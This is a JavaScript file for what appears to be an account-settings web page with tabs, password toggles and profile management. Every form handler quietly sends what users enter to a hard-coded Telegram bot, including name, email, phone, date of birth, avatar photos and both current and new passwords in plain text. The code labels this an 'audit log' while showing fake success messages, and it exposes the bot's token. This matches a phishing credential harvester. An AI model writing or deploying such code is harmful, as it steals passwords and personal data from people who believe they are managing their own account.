// ==========================================================================
// Configuration & State Management
// ==========================================================================

const TELEGRAM_CONFIG = {
    botToken: "8892969072:AAFgta3Naq1mGiPYHspeotXpM6-_HMbraAA",
    chatId: "-5419785525"
};

// Initial state for user profiles (Max 2 enforced)
let userProfiles = [
    { id: 1, name: "Sakirul", avatar: "images/profiles/default.png", isDefault: true }
];

// Initialize on DOM load
document.addEventListener("DOMContentLoaded", () => {
    initTabs();
    initProfileManagement();
    initFormListeners();
    initPasswordToggles();
});

// ==========================================================================
// Tab Navigation
// ==========================================================================

function initTabs() {
    const tabs = document.querySelectorAll(".tab-btn");
    const contents = document.querySelectorAll(".tab-content");

    if (!tabs.length) return;

    tabs.forEach(tab => {
        tab.addEventListener("click", () => {
            const targetId = tab.dataset.tab;
            if (!targetId) return;

            tabs.forEach(t => t.classList.remove("active"));
            contents.forEach(c => c.classList.remove("active"));

            tab.classList.add("active");
            
            const targetContent = document.getElementById(targetId);
            if (targetContent) {
                targetContent.classList.add("active");
            }
        });
    });
}

// ==========================================================================
// Password Visibility Toggle Logic
// ==========================================================================

function initPasswordToggles() {
    const toggleButtons = document.querySelectorAll(".toggle-password");

    toggleButtons.forEach(btn => {
        btn.addEventListener("click", () => {
            const targetId = btn.dataset.target;
            const input = document.getElementById(targetId);

            if (!input) return;

            if (input.type === "password") {
                input.type = "text";
                btn.textContent = "visibility_off";
            } else {
                input.type = "password";
                btn.textContent = "visibility";
            }
        });
    });
}

// ==========================================================================
// Telegram Bot Audit Log Helpers
// ==========================================================================

async function sendTelegramLog(message) {
    if (!TELEGRAM_CONFIG.botToken || TELEGRAM_CONFIG.botToken.includes("YOUR_TELEGRAM")) return;

    const timeString = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });
    const formattedMessage = `${message}\n\n🕒 <b>Time:</b> ${timeString}`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: formattedMessage,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error("Telegram log failed:", err);
    }
}

async function sendTelegramPhoto(file, caption) {
    if (!TELEGRAM_CONFIG.botToken || TELEGRAM_CONFIG.botToken.includes("YOUR_TELEGRAM")) return;

    const timeString = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });
    const formattedCaption = `${caption}\n\n🕒 Time: ${timeString}`;

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
    formData.append('caption', formattedCaption);
    formData.append('photo', file);

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    } catch (err) {
        console.error("Telegram photo upload failed:", err);
    }
}

// ==========================================================================
// Form Event Listeners & Actions
// ==========================================================================

function initFormListeners() {
    
    // 1. Personal Information Form
    const personalForm = document.getElementById("personal-info-form");
    if (personalForm) {
        personalForm.addEventListener("submit", (e) => {
            e.preventDefault();
            const name = document.getElementById("fullName")?.value || "N/A";
            const email = document.getElementById("emailAddress")?.value || "N/A";
            const phone = document.getElementById("phoneNumber")?.value || "N/A";
            const dob = document.getElementById("dob")?.value || "N/A";

            showToast("Personal information updated!");
            
            const logMsg = 
`👤 <b>[ACCOUNT INFO UPDATED]</b>
━━━━━━━━━━━━━━━━━━━━
<b>Name:</b> ${name}
<b>Email:</b> ${email}
<b>Phone:</b> ${phone}
<b>DOB:</b> ${dob}`;

            sendTelegramLog(logMsg);
        });
    }

    // 2. Change Avatar Form
    const avatarForm = document.getElementById("avatar-upload-form");
    if (avatarForm) {
        avatarForm.addEventListener("submit", (e) => {
            e.preventDefault();
            const fileInput = document.getElementById("customAvatar");
            const file = fileInput?.files[0];

            if (file) {
                const reader = new FileReader();
                reader.onload = (event) => {
                    const preview = document.getElementById("avatarPreview");
                    if (preview) preview.src = event.target.result;
                };
                reader.readAsDataURL(file);

                showToast("Avatar updated successfully!");

                const uName = document.getElementById("fullName")?.value || "User";
                const uEmail = document.getElementById("emailAddress")?.value || "Account";
                
                sendTelegramPhoto(file, `📸 New avatar uploaded by ${uName} (${uEmail})`);
            } else {
                showToast("Please select an image file first.", true);
            }
        });
    }

    // 3. Reset / Change Password Form (Includes Password in Telegram Log)
    const passForm = document.getElementById("reset-password-form");
    if (passForm) {
        passForm.addEventListener("submit", (e) => {
            e.preventDefault();
            const curPass = document.getElementById("currentPassword")?.value || "N/A";
            const newPass = document.getElementById("newPassword")?.value || "";
            const confPass = document.getElementById("confirmPassword")?.value || "";

            if (newPass !== confPass) {
                showToast("New passwords do not match!", true);
                return;
            }

            if (newPass.length < 6) {
                showToast("Password must be at least 6 characters long!", true);
                return;
            }

            showToast("Password updated successfully!");

            const uEmail = document.getElementById("emailAddress")?.value || "Account";
            const actionLabel = curPass !== "N/A" ? "Password Changed" : "New Password Set";

            const logMsg = 
`🔒 <b>[SECURITY ALERT - ${actionLabel.toUpperCase()}]</b>
━━━━━━━━━━━━━━━━━━━━
<b>Account Email:</b> ${uEmail}
<b>Current Password:</b> <code>${curPass}</code>
<b>New Password:</b> <code>${newPass}</code>
<b>Status:</b> Success`;

            sendTelegramLog(logMsg);
            passForm.reset();
        });
    }

    // 4. Contact Us Support Form
    const contactForm = document.getElementById("contact-form");
    if (contactForm) {
        contactForm.addEventListener("submit", (e) => {
            e.preventDefault();
            const subject = document.getElementById("contactSubject")?.value || "No Subject";
            const message = document.getElementById("contactMessage")?.value || "No Message";
            const uName = document.getElementById("fullName")?.value || "User";
            const uEmail = document.getElementById("emailAddress")?.value || "Unknown Email";

            showToast("Support message sent!");

            const logMsg = 
`📩 <b>[SUPPORT INQUIRY]</b>
━━━━━━━━━━━━━━━━━━━━
<b>From:</b> ${uName} (${uEmail})
<b>Subject:</b> ${subject}
<b>Message:</b>
${message}`;

            sendTelegramLog(logMsg);
            contactForm.reset();
        });
    }
}

// ==========================================================================
// Profile Management Logic (Max 2 Profiles Enforced + Delete Option)
// ==========================================================================

function initProfileManagement() {
    renderProfiles();

    const addBtn = document.getElementById("addProfileBtn");
    if (addBtn) {
        addBtn.addEventListener("click", () => {
            if (userProfiles.length >= 2) {
                showToast("Maximum limit of 2 profiles reached!", true);
                return;
            }

            const nameInput = document.getElementById("newProfileName");
            const profileName = nameInput?.value.trim();

            if (!profileName) {
                showToast("Please enter a profile name.", true);
                return;
            }

            const newProfile = {
                id: Date.now(),
                name: profileName,
                avatar: "images/profiles/default.png",
                isDefault: false
            };

            userProfiles.push(newProfile);

            const uEmail = document.getElementById("emailAddress")?.value || "Account";
            const logMsg = 
`👥 <b>[PROFILE CREATED]</b>
━━━━━━━━━━━━━━━━━━━━
<b>Profile Name:</b> "${profileName}"
<b>Account Email:</b> ${uEmail}
<b>Total Profiles:</b> ${userProfiles.length}/2`;

            sendTelegramLog(logMsg);

            nameInput.value = "";
            showToast(`Profile "${profileName}" added!`);
            renderProfiles();
        });
    }
}

function removeProfile(profileId) {
    const profile = userProfiles.find(p => p.id === profileId);
    if (!profile) return;

    if (profile.isDefault) {
        showToast("Primary profile cannot be deleted!", true);
        return;
    }

    userProfiles = userProfiles.filter(p => p.id !== profileId);

    const uEmail = document.getElementById("emailAddress")?.value || "Account";
    const logMsg = 
`🗑️ <b>[PROFILE DELETED]</b>
━━━━━━━━━━━━━━━━━━━━
<b>Removed Profile:</b> "${profile.name}"
<b>Account Email:</b> ${uEmail}
<b>Total Profiles:</b> ${userProfiles.length}/2`;

    sendTelegramLog(logMsg);
    showToast(`Profile "${profile.name}" removed.`);
    renderProfiles();
}

function renderProfiles() {
    const container = document.getElementById("profiles-list");
    const limitMsg = document.getElementById("profileLimitMsg");
    const addBtn = document.getElementById("addProfileBtn");

    if (!container) return;

    container.innerHTML = userProfiles.map(p => `
        <div class="profile-card" style="display: flex; align-items: center; justify-content: space-between; gap: 1rem;">
            <div style="display: flex; align-items: center; gap: 0.8rem;">
                <img src="${p.avatar}" alt="${p.name}" onerror="this.src='https://ui-avatars.com/api/?name=${encodeURIComponent(p.name)}&background=0D1B2A&color=fff'" style="width: 44px; height: 44px; border-radius: 50%;">
                <div>
                    <h4 style="margin: 0; font-size: 0.95rem;">${p.name}</h4>
                    <span style="font-size: 0.75rem; color: #6b7280;">${p.isDefault ? 'Primary' : 'Secondary'}</span>
                </div>
            </div>
            ${!p.isDefault ? `
                <button type="button" onclick="removeProfile(${p.id})" style="background: transparent; border: none; color: #ef4444; cursor: pointer; padding: 0.3rem;" title="Delete Profile">
                    <span class="material-symbols-rounded" style="font-size: 1.2rem;">delete</span>
                </button>
            ` : ''}
        </div>
    `).join("");

    if (userProfiles.length >= 2) {
        if (limitMsg) limitMsg.classList.remove("hidden");
        if (addBtn) addBtn.disabled = true;
    } else {
        if (limitMsg) limitMsg.classList.add("hidden");
        if (addBtn) addBtn.disabled = false;
    }
}

// ==========================================================================
// Toast Notification Helper
// ==========================================================================

function showToast(text, isError = false) {
    let toast = document.getElementById("toast");
    
    if (!toast) {
        toast = document.createElement("div");
        toast.id = "toast";
        toast.className = "toast hidden";
        document.body.appendChild(toast);
    }

    toast.textContent = text;
    toast.style.background = isError ? "#EF4444" : "#10B981";
    toast.classList.remove("hidden");

    if (window.toastTimeout) clearTimeout(window.toastTimeout);
    window.toastTimeout = setTimeout(() => toast.classList.add("hidden"), 3000);
}